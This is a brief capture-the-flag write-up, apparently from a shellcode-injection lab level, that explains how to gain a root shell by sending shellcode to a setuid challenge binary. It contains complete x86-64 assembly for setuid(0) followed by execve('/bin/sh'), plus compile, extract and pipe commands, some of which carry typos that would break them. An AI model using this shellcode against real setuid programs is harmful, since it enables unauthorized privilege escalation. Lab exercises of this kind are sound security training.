## level1_teaching1

Objective: Send shellcode as standard input (code injection).

* Make program run as root: setuid(0)
* Get a shell "/bin/sh"
* execve("bin/sh") replaces current process w/ shell process

Memory: 0x17011000

![lvl1](https://user-images.githubusercontent.com/45490952/119248408-d2e08880-bb45-11eb-8910-8cabd5888ed3.PNG)

Use a writeable directory: /tmp

``` $ find . -writable ``

Here is the shellcode I used (mostly from Yan):
```
.global _start

_start:
.intel_syntax noprefix
  mov rax, 0x69 # setuid
  mov rdi, 0 ; setuid=0
  syscall
  
  mov rax, 0x3b # 59, execve
  lea rdi, [rip+binsh]
  mov rsi, 0
  mov rdx, 0
  syscall
  
binsh:
  .string "/bin/sh"
```

Compile, extract, run!
```
$ gcc -nostdlib -static -payload.s -o -payload-elf
$ objcopy --dump-section .text=payload-raw payload-elf
$ (cat ./tmp/payload-raw; cat) | ./babyshell_level1_teaching1
```

![uwu](https://user-images.githubusercontent.com/45490952/119249036-7cc21400-bb4a-11eb-8c51-d3433db341e1.PNG)


